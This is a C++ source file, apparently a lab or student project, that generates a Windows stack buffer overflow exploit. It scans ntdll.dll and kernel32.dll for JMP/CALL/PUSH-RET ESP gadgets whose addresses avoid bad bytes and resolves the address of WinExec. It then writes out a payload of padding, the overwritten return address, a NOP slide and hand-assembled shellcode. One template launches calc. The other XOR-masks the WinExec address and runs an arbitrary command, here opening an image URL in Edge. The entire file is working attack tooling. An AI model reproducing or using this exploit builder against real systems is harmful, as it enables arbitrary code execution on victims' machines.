#include "stdio.h"
#include <windows.h>
#include "stdlib.h"

constexpr auto OUTPUT_IN_FILE = 0;							//1 - in file, 0 in std::out;
constexpr auto DISPLAY_INFO = 0;							//1 - display find history, 0 - no display
constexpr auto BUFFER_SIZE = 20;							//size in bytes;
constexpr auto TRASH = 0x41;								//fill buffer value
constexpr auto BYTES_BETWEEN_BUFFER_AND_ESP = 4;			//byte size non use data before ESP 
constexpr auto TARGET_REGISTER = "ESP";						//register name
constexpr auto DEFAULT_ALL = 0b111;							//all cases
constexpr auto GOOD_ADDRESS_WITHOUT_ZERO = true;			//true - find addresses without 0x00 and 0x01, false - only without 0x01
constexpr auto OUTPUT_FILE_NAME = "output.bin";

enum ECommandTypes {
	JMP			= 0b001,	//JMP reg
	CALL		= 0b010,	//CALL reg
	PUSH_RET	= 0b100,	//PUSH reg; RET
	JC			= 0b011,	//JMP + CALL
	JPR			= 0b101,	//JMP + PUSH_RET
	CPR			= 0b110,	//CALL + PUSH_RET
	JCPR		= 0b111		//ALL
};

class DLLReader {
public:
	explicit DLLReader(ECommandTypes commandTypes) {
		this->_jmp = this->_call = this->_push = 0;
		this->_commandTypes = commandTypes;
		this->_countFindedExploitCases = 0;
		this->_countToTarget = 0;
		this->_countToTarget += this->_commandTypes & 0b001 ? 1 : 0;
		this->_countToTarget += this->_commandTypes & 0b010 ? 1 : 0;
		this->_countToTarget += this->_commandTypes & 0b100 ? 1 : 0;
		this->exploitAddress = 0x0000;
		this->_firstPosition = nullptr;
		this->_opcodeJMP = this->_opcodeCALL = this->_opcodePUSH = nullptr;
		this->_fail = false;
		if (this->_commandTypes & 0b001) {
			this->_opcodeJMP = new BYTE[2];
			this->_opcodeJMP[0] = 0xFF;
			this->_opcodeJMP[1] = 0xE4;
		}
		if (this->_commandTypes & 0b010) {
			this->_opcodeCALL = new BYTE[2];
			this->_opcodeCALL[0] = 0xFF;
			this->_opcodeCALL[1] = 0xD4;
		}
		if (this->_commandTypes & 0b100) {
			this->_opcodePUSH = new BYTE[2];
			this->_opcodePUSH[0] = 0x54;
			this->_opcodePUSH[1] = 0xC3;
		}
	}

	~DLLReader() {
		delete[] this->_opcodeJMP;
		delete[] this->_opcodeCALL;
		delete[] this->_opcodePUSH;
	}

	/**
	/	@return: opcode address or nullptr if DLL do not contain chosen command(s). 
	**/
	void * getExploitAddress() {
		tryLoadDll(this->_ddlLibraryName);
		if (this->_fail) return nullptr;
		findInDll();
		if (this->_fail) {
			printf("Fail: when search reference for opcode with ESP\n");
		}
		return (void *)this->exploitAddress;
	}

	/**
	/	@return: opcode address without 0x01 or nullptr if DLL do not contain chosen command(s).
	**/
	void * getGoodExploitAddress() {
		tryLoadDll(this->_ddlLibraryName);
		if (this->_fail) return nullptr;
		findTheBestAddressInDll();
		if (this->_fail) {
			this->_fail = false;
			tryLoadDll(this->_secondDllName);
			if (this->_fail) return nullptr;
			findTheBestAddressInDll();
			if (this->_fail) {
				printf("Fail: when search reference for opcode with ESP\n");
			}
		}
		return (void *)this->exploitAddress;
	}


private:
	BYTE * _jmp;
	BYTE * _call;
	BYTE * _push;
	BYTE * exploitAddress;
	BYTE * _opcodeJMP;
	BYTE * _opcodeCALL;
	BYTE * _opcodePUSH;
	BYTE * _firstPosition;
	ECommandTypes _commandTypes;	
	BYTE _countFindedExploitCases;		//how we have currently finded cases
	BYTE _countToTarget;				// if 0 - all finded, start init how hemingDistance(_commandTypes)
	HMODULE _loadedDll;
	bool _fail;
	char * _ddlLibraryName = "ntdll.dll";
	char * _secondDllName = "kernel32.dll";

	void findInDll() {
		this->_firstPosition = (BYTE*)this->_loadedDll;
		__try {
			while (this->_countToTarget >= 1) {
				checkJMP();
				checkCALL();
				checkPUSH();
				this->_firstPosition++;
			}
		}
		__except (1) {
			if (DISPLAY_INFO) printf("Finish searching\n");
		}
		freeDll();

		if (DISPLAY_INFO) printf("Finish searching\n");

		if (this->_commandTypes & 0b001) {
			if (!this->_opcodeJMP) {
				this->exploitAddress = this->_jmp;
				return;
			}
		}

		if (this->_commandTypes & 0b010) {
			if (!this->_opcodeCALL) {
				this->exploitAddress = this->_call;
				return;
			}
		}

		if (this->_commandTypes & 0b100) {
			if (!this->_opcodePUSH) {
				this->exploitAddress = this->_push;
				return;
			}
		}

		this->_fail = true;
	}

	void findTheBestAddressInDll() {
		this->_firstPosition = (BYTE*)this->_loadedDll;
		BYTE * opcode;
		__try {
			while (this->_countToTarget >= 1) {
				if (this->_opcodeJMP[0] == this->_firstPosition[0] && this->_opcodeJMP[1] == this->_firstPosition[1]) {
					opcode = this->_firstPosition;
					if (isFirstGoodAddress(opcode)) {
						freeDll();
						if (DISPLAY_INFO) printf("You find good JMP %s on adress 0x%p\n", TARGET_REGISTER, opcode);
						return;
					}
					if (DISPLAY_INFO) printf("You find not good JMP %s on adress 0x%p\n", TARGET_REGISTER, opcode);
				}
				if (this->_opcodeCALL[0] == this->_firstPosition[0] && this->_opcodeCALL[1] == this->_firstPosition[1]) {
					opcode = this->_firstPosition;
					if (isFirstGoodAddress(opcode)) {
						freeDll();
						if (DISPLAY_INFO) printf("You find good CALL %s on adress 0x%p\n", TARGET_REGISTER, opcode);
						return;
					}
					if (DISPLAY_INFO) printf("You find not good CALL %s on adress 0x%p\n", TARGET_REGISTER, opcode);
				}
				if (this->_opcodePUSH[0] == this->_firstPosition[0] && this->_opcodePUSH[1] == this->_firstPosition[1]) {
					opcode = this->_firstPosition;
					if (isFirstGoodAddress(opcode)) {
						freeDll();
						if (DISPLAY_INFO) printf("You find good PUSH %s on adress 0x%p\n", TARGET_REGISTER, opcode);
						return;
					}
					if (DISPLAY_INFO) printf("You find not good PUSH %s on adress 0x%p\n", TARGET_REGISTER, opcode);
				}
				this->_firstPosition++;
			}
		}
		__except (1) {
			if (DISPLAY_INFO) printf("Finish searching\n");
		}
		freeDll();
		if (DISPLAY_INFO) printf("Finish searching\n");
	}

	bool isFirstGoodAddress(BYTE * opcode) {
		if (GOOD_ADDRESS_WITHOUT_ZERO) {
			if (isTheBestAddress(opcode)) {
				this->exploitAddress = opcode;
				return true;
			}
		} else {
			if (isGoodAddress(opcode)) {
				this->exploitAddress = opcode;
				return true;
			}
		}
		return false;
	}

	//address is the best if is without 0x00 and 0x01
	bool isTheBestAddress(BYTE * opcode) {
		char tmp[9];
		sprintf(tmp, "%p", opcode);
		BYTE arrayOpcode[4];
		for (int i = 0; i < 4; i++) {
			arrayOpcode[i] = 0x00;
			arrayOpcode[i] += getHexFromChar(tmp[i * 2]) * 16;
			arrayOpcode[i] += getHexFromChar(tmp[2 * i + 1]);
			if (arrayOpcode[i] <= 0x01) return false;
		}
		return true;
	}

	//address is good if is without 0x01
	bool isGoodAddress(BYTE * opcode) {
		char tmp[9];
		sprintf(tmp, "%p", opcode);
		BYTE arrayOpcode[4];
		for (int i = 0; i < 4; i++) {
			arrayOpcode[i] = 0x00;
			arrayOpcode[i] += getHexFromChar(tmp[i * 2]) * 16;
			arrayOpcode[i] += getHexFromChar(tmp[2 * i + 1]);
			if (arrayOpcode[i] == 0x01) return false;
		}
		return true;
	}

	BYTE getHexFromChar(char c) {
		if (c >= '0' && c <= '9') {
			return (BYTE)(c - '0');
		}
		switch (c) {
		case 'a':
		case 'b':
		case 'c':
		case 'd':
		case 'e':
		case 'f':
			return (BYTE)(c - 'a' + (BYTE)10);
		case 'A':
		case 'B':
		case 'C':
		case 'D':
		case 'E':
		case 'F':
			return (BYTE)(c - 'A' + (BYTE)10);
		default: printf("Not a hex symbol '%c'\n", c);
			return (BYTE)0x00;
		}
	}

	void checkJMP() {
		if (this->_opcodeJMP) {
			if (this->_opcodeJMP[0] == this->_firstPosition[0] && this->_opcodeJMP[1] == this->_firstPosition[1]) {
				this->_countToTarget--;
				this->_countFindedExploitCases++;
				this->_jmp = this->_firstPosition;
				delete[] this->_opcodeJMP;
				this->_opcodeJMP = nullptr;
				if (DISPLAY_INFO) printf("You find JMP %s on adress 0x%p\n", TARGET_REGISTER, this->_jmp);
			}
		} 
	}

	void checkCALL() {
		if (this->_opcodeCALL) {
			if (this->_opcodeCALL[0] == this->_firstPosition[0] && this->_opcodeCALL[1] == this->_firstPosition[1]) {
				this->_countToTarget--;
				this->_countFindedExploitCases++;
				this->_call = this->_firstPosition;
				delete[] this->_opcodeCALL;
				this->_opcodeCALL = nullptr;
				if (DISPLAY_INFO) printf("You find CALL %s on adress 0x%p\n", TARGET_REGISTER, this->_call);
			}
		}
	}

	void checkPUSH() {
		if (this->_opcodePUSH) {
			if (this->_opcodePUSH[0] == this->_firstPosition[0] && this->_opcodePUSH[1] == this->_firstPosition[1]) {
				this->_countToTarget--;
				this->_countFindedExploitCases++;
				this->_push = this->_firstPosition;
				delete[] this->_opcodePUSH;
				this->_opcodePUSH = nullptr;
				if (DISPLAY_INFO) printf("You find PUSH %s on adress 0x%p\n", TARGET_REGISTER, this->_push);
			}
		}
	}

	void tryLoadDll(char * name) {
		this->_loadedDll = LoadLibrary(TEXT(name));
		if (!this->_loadedDll) {
			printf("Problem loading DLL \"%s\"\n", name);
			this->_fail = true;
		}
	}

	void freeDll() {
		FreeLibrary(this->_loadedDll);
		this->_loadedDll = nullptr;
	}
};

class WinExecFinder {
public:
	WinExecFinder() {
		this->_fail = false;
		this->functionAddress = nullptr;
		this->_loadedDll = nullptr;
	}

	void * getWinExecAddress() {
		tryLoadLibrary();
		if (this->_fail) return nullptr;
		tryLoadFunction();
		if (this->_fail) return nullptr;
		return (void*)loadedWinExec;
	}

private:
	bool _fail;
	HMODULE _loadedDll;
	BYTE * functionAddress;
	const char _functionName[8] = "WinExec";
	const char _dllName[13] = "Kernel32.dll";
	UINT(*loadedWinExec)(LPCSTR, UINT) = nullptr;

	void tryLoadFunction() {
		loadedWinExec = (UINT (*)(LPCSTR, UINT))GetProcAddress(this->_loadedDll, this->_functionName);
		if (loadedWinExec) {
			if (DISPLAY_INFO) printf("Funkce \"%s\" is successfully loaded\n", this->_functionName);
		} else {
			printf("Problem loading function \"%s\"\n", this->_functionName);
			this->_fail = true;
		}
	}

	void tryLoadLibrary() {
		this->_loadedDll = LoadLibrary(TEXT(this->_dllName));
		if (!this->_loadedDll) {
			printf("Problem loading DLL \"%s\"\n", this->_dllName);
			this->_fail = true;
		} else {
			if (DISPLAY_INFO) printf("Success loading DLL \"%s\"\n", this->_dllName);
		}
	}

	void freeLibraryDll() {
		FreeLibrary(this->_loadedDll);
		this->_loadedDll = nullptr;
	}
};

class ExploitCreater {
public:
	//exploitData must be ended \0.
	ExploitCreater(void *winExecAddress, void *referenceToESPAddress, char * commandForWinExec) {
		this->_destroyExploitData = this->_destroyHeaderData = false;
		this->_xorMask[0] = this->_xorMask[1] = this->_xorMask[2] = this->_xorMask[3] = 0b00111100;
		if (commandForWinExec == nullptr) {
			if (winExecAddress != nullptr && referenceToESPAddress != nullptr) {
				this->winExecAddress = winExecAddress;
				this->referenceToESPAddress = referenceToESPAddress;
				make4BArrayFromPointer(winExecAddress, arrayWinExecAddress);
				make4BArrayFromPointer(referenceToESPAddress, arrayReferenceToESPAddress);
				createHeader();
				createCalcTemplate();
				mergeHeaderWithExploitData(nullptr);
				this->_fail = false;
				if (DISPLAY_INFO) printf("exploit data NO\nWinExec addr OK\ncall ESP     OK\n");
			} else {
				this->_fail = true;
				printf("Need more information for attack\n");
			}
			return;
		} else {
			if (winExecAddress != nullptr && referenceToESPAddress != nullptr) {
				this->winExecAddress = winExecAddress;
				this->referenceToESPAddress = referenceToESPAddress;
				make4BArrayFromPointer(winExecAddress, arrayWinExecAddress);
				make4BArrayFromPointer(referenceToESPAddress, arrayReferenceToESPAddress);
				createUniversalTemplate();
				createHeader();
				mergeHeaderWithExploitData(commandForWinExec);
				if (DISPLAY_INFO) printf("exploit data OK\nWinExec addr NON\ncall ESP     OK\n");
				this->_fail = false;
			} else {
				this->_fail = true;
				printf("Need more information for attack(address \"JMP|CALL|PUSH_RET ESP\" istruction)\n");
			}
			return;
		} 
		printf("Not supported input sequence\n");
		this->_fail = true;
	}

	~ExploitCreater() {
		if (this->_destroyHeaderData)  delete[] this->headerData;
		if (this->_destroyExploitData) delete[] this->exploitData;
									   delete[] this->outputData;
	}

	void writeToFile(const char * name) {
		if (this->_fail) {
			printf("Undefined error\n");
			return;
		}
		FILE * file;
		file = fopen(name, "w+b");
		if (file == nullptr) {
			printf("Can not open file \"%s\"\n", name);
			return;
		}
		fwrite(this->outputData, sizeof(BYTE), this->outputSize, file);
		fclose(file);
		printf("File '%s' successfully created\n", name);
	}

	void pirntInTerminal() {
		if (this->_fail) {
			printf("Undefined error\n");
			return;
		}
		printf("Please, write this byte sequence to terminal(if not char press key ALT + number)\n");
		for (int i = 0; i < this->outputSize; i++) {
			BYTE b = this->outputData[i];
			if (i < BUFFER_SIZE + BYTES_BETWEEN_BUFFER_AND_ESP) {
				printf("%c|", b);
			} else {
				printf("%d|", b);
			}
		}
		printf("\n");
	}

private:
	void * winExecAddress;
	void * referenceToESPAddress;
	BYTE   arrayWinExecAddress[4];				
	BYTE   arrayReferenceToESPAddress[4];		
	BYTE _xorMask[4];
	BYTE * headerData;
	BYTE * exploitData;
	BYTE * outputData;			
	unsigned int exploitDataSize;
	unsigned int outputSize;
	bool _fail;
	bool _destroyHeaderData;
	bool _destroyExploitData;

	void createHeader() {
		this->headerData = new BYTE[BUFFER_SIZE + BYTES_BETWEEN_BUFFER_AND_ESP];
		this->_destroyHeaderData = true;
		for (int i = 0; i < BUFFER_SIZE + BYTES_BETWEEN_BUFFER_AND_ESP; i++) {
			this->headerData[i] = TRASH;
		}
	}

	void mergeHeaderWithExploitData(char * winexecCommand) {
		if (winexecCommand != nullptr) {
			int length = -1;
			while (winexecCommand[++length] != '\0');
			this->outputSize = this->exploitDataSize + BUFFER_SIZE + BYTES_BETWEEN_BUFFER_AND_ESP + 4 + length;
		} else {
			this->outputSize = this->exploitDataSize + BUFFER_SIZE + BYTES_BETWEEN_BUFFER_AND_ESP + 4;
		}
		this->outputData = new BYTE[this->outputSize];
		int i;
		for (i = 0; i < BUFFER_SIZE + BYTES_BETWEEN_BUFFER_AND_ESP; i++) {
			this->outputData[i] = this->headerData[i];
		}
		revers4BArray(this->arrayReferenceToESPAddress);							//	0
		this->outputData[i++] = this->arrayReferenceToESPAddress[0];
		this->outputData[i++] = this->arrayReferenceToESPAddress[1];
		this->outputData[i++] = this->arrayReferenceToESPAddress[2];
		this->outputData[i++] = this->arrayReferenceToESPAddress[3];
		
		for (int j = 0; j < this->exploitDataSize; j++) {
			this->outputData[i++] = this->exploitData[j];
		}

		if (winexecCommand != nullptr) {
			for (int j = 0; winexecCommand[j] != '\0'; j++) {
				this->outputData[i++] = (BYTE)winexecCommand[j];
			}
		}
	}	

	void controlAddressWinExec() {
		for (int i = 0; i < 4; i++) {
			while ((this->arrayWinExecAddress[i] ^ this->_xorMask[i]) < 0x02) {
				while (++this->_xorMask[i] < 0x01);
			}
			this->arrayWinExecAddress[i] ^= this->_xorMask[i];
		}
	}

	//XOR EAX,EAX			0x31 0xC0
	//PUSH EAX				0x50
	//PUSH 636C6163			0x68 0x63 0x61 0x6C 0x63
	//MOV ECX,ESP			0x89 0xE1
	//???ADD EAX,1				0x83 0xC0 0x01???
	//PUSH EAX				0x50
	//PUSH ECX				0x51
	//MOV EAX,WinExecAdd	0xB8 (?address with reversed bytes?)
	//CALL EAX				0xFF 0xD0
	void createCalcTemplate() {
		this->exploitData = new BYTE[32];
		this->_destroyExploitData = true;
		this->exploitDataSize = 32;
		for (int i = 0; i < this->exploitDataSize; i++) {
			this->exploitData[i] = calcTemplate[i];
		}
		revers4BArray(this->arrayWinExecAddress);									//	1
		this->exploitData[17] = this->arrayWinExecAddress[0];
		this->exploitData[18] = this->arrayWinExecAddress[1];
		this->exploitData[19] = this->arrayWinExecAddress[2];
		this->exploitData[20] = this->arrayWinExecAddress[3];
		//reverseField(this->exploitData, this->exploitDataSize = 32);				//	2
	}

	void createUniversalTemplate() {
		this->exploitData = new BYTE[32];
		this->_destroyExploitData = true;
		this->exploitDataSize = 32;
		for (int i = 0; i < this->exploitDataSize; i++) {
			this->exploitData[i] = universalTemplate[i];
		}
		controlAddressWinExec();
		revers4BArray(this->arrayWinExecAddress);									//	1
		this->exploitData[13] = this->arrayWinExecAddress[0];
		this->exploitData[14] = this->arrayWinExecAddress[1];
		this->exploitData[15] = this->arrayWinExecAddress[2];
		this->exploitData[16] = this->arrayWinExecAddress[3];
		revers4BArray(this->_xorMask);
		this->exploitData[18] = this->_xorMask[0];
		this->exploitData[19] = this->_xorMask[1];
		this->exploitData[20] = this->_xorMask[2];
		this->exploitData[21] = this->_xorMask[3];
		//reverseField(this->exploitData, this->exploitDataSize = 32);				//	2
	}

	void make4BArrayFromPointer(void * pointer, BYTE arr[]) {
		char tmp[9];
		sprintf(tmp, "%p", pointer);

		for (int i = 0; i < 4; i++) {
			arr[i] = 0x00;
			arr[i] += getHexValueFromChar(tmp[2 * i]) * 16;
			arr[i] += getHexValueFromChar(tmp[2 * i + 1]);
		}
	}

	void revers4BArray(BYTE arr[]) {
		BYTE tmp = arr[0];
		arr[0] = arr[3];
		arr[3] = tmp;
		tmp = arr[1];
		arr[1] = arr[2];
		arr[2] = tmp;
	}

	// !!! len % 4 == 0
	void reverseField(BYTE * arr, int len) {
		for (int i = 0; i < len / 4; i++) {
			BYTE tmp = arr[i * 4];
			arr[i * 4] = arr[i * 4 + 3];
			arr[i * 4 + 3] = tmp;
			tmp = arr[i * 4 + 1];
			arr[i * 4 + 1] = arr[i * 4 + 2];
			arr[i * 4 + 2] = tmp;
		}
	}

	BYTE getHexValueFromChar(char c) {
		if (c >= '0' && c <= '9') {
			return (BYTE)(c - '0');
		}
		switch (c) {
			case 'a': 
			case 'b':
			case 'c':
			case 'd':
			case 'e':
			case 'f':
				return (BYTE)(c - 'a' + (BYTE)10);
			case 'A':
			case 'B':
			case 'C':
			case 'D':
			case 'E':
			case 'F':
				return (BYTE)(c - 'A' + (BYTE)10);
			default: printf("Not a hex symbol '%c'\n", c);
				return (BYTE)0x00;
		}
	}

	BYTE calcTemplate[32] =   { 0x90, 0x90, 0x90, 0x90,			//NOP slide
								0x31, 0xc0,						//XOR EAX,EAX
								0x50,							//PUSH EAX	
								0x68, 0x63, 0x61, 0x6c, 0x63,	//PUSH 636C6163
								0x89, 0xE1,						//MOV ECX,ESP
								//pass							//ADD EAX,1 ???,
								0x50,							//PUSH EAX
								0x51,							//PUSH ECX
								0xb8, 0xff, 0xff, 0xff, 0xff,	//MOV EAX,WinExecAdd ()
								0xff, 0xd0,						//CALL EAX
								0x90, 0x90, 0x90, 0x90, 0x90,	//NOP slide
								0x00, 0x00, 0x00, 0x00 };		//empty bytes

	BYTE universalTemplate[32] =  { 0x90, 0x90, 0x90, 0x90,			//NOP slide
									0x8d, 0x4c, 0xe4, 0x20,			//LEA ECX,[ESP+20] (20 == 32 byte)
									0x31, 0xc0,						//XOR EAX,EAX	
									0x50,							//PUSH EAX
									0x51,							//PUSH ECX
									0xb8, 0xff, 0xff, 0xff, 0xff,	//MOV EAX,mask ^ WinExecAdd ()
									0x35, 0xff, 0xff, 0xff, 0xff,	//XOR EAX,mask
									0xff, 0xd0,						//CALL EAX
									0x90, 0x90, 0x90, 0x90,			//NOP slide
									0x90, 0x90, 0x90, 0x90 };		//NOP slide
	// XOR EAX,12345678  0x35 0x78 0x56 0x34 0x12
	};

int main(int argc, char** argv) {
	//work set (+0+1-2)
	DLLReader reader((ECommandTypes)DEFAULT_ALL);
	void * changeInstructionFlowAdd = reader.getGoodExploitAddress();
	printf("m0x%p - JMP|CALL|PUSH_RET ESP  \n", changeInstructionFlowAdd);
	WinExecFinder finder;
	void * winExecAdd = finder.getWinExecAddress();
	printf("0x%p - address function WinExec\n", winExecAdd);
	ExploitCreater creater(winExecAdd, changeInstructionFlowAdd, "\"cmd\" /c start microsoft-edge:https://i.imgur.com/rMRPGEG.jpg");
	creater.pirntInTerminal();
	creater.writeToFile(OUTPUT_FILE_NAME);
	return 0;
}



